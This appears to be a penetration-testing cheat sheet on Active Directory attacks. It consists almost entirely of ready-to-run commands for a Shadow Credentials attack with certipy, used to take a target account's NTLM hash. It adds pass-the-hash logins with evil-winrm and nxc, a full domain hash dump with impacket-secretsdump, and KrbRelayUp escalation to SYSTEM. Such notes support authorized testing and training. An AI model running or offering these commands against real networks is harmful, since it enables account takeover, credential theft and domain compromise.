# Shadow Credentials (certipy shadow)

If you have `GenericWrite` or `GenericAll` over an account, add a Key Credential to that account. The DC then issues a certificate for it, letting you obtain the NTLM hash via PKINIT without needing ESC* vulnerabilities.

```bash
# Requires: GenericWrite or GenericAll on target user/computer
# Requires: ADCS present OR DC supports PKINIT

# Add shadow credential to target account
certipy shadow auto -username <USER>@<DOMAIN> -password <PASS> -account <TARGET_USER>
# Returns: <TARGET_USER>.pfx + NTLM hash of <TARGET_USER>

# OR: step-by-step
certipy shadow add -username <USER>@<DOMAIN> -password <PASS> -account <TARGET_USER>
# Outputs device ID to use for removal later

certipy auth -pfx <TARGET_USER>.pfx -domain <DOMAIN>
# Returns NTLM hash

# Pass-the-hash
evil-winrm -i <DC_IP> -u <TARGET_USER> -H <NTLM_HASH>
nxc smb <DC_IP> -u <TARGET_USER> -H <NTLM_HASH>

# Clean up
certipy shadow remove -username <USER>@<DOMAIN> -password <PASS> \
  -account <TARGET_USER> -device-id <DEVICE_ID>
```

## KrbRelayUp + DCSync (after getting machine account hash)

If Shadow Credentials + PKINIT gives you a machine account TGT:
```bash
# Dump all hashes with machine account TGT
impacket-secretsdump -k -no-pass <DC_HOSTNAME>.<DOMAIN>
# OR:
impacket-secretsdump <DOMAIN>/<MACHINE_ACCOUNT$>@<DC_IP> -hashes :<MACHINE_NTLM>

# KrbRelayUp path to SYSTEM (local privilege escalation):
KrbRelayUp.exe relay -d <DOMAIN> -cn <COMPUTER_NAME> -cp <CERT.pfx> -cpa <CERT_PASSWORD>
```
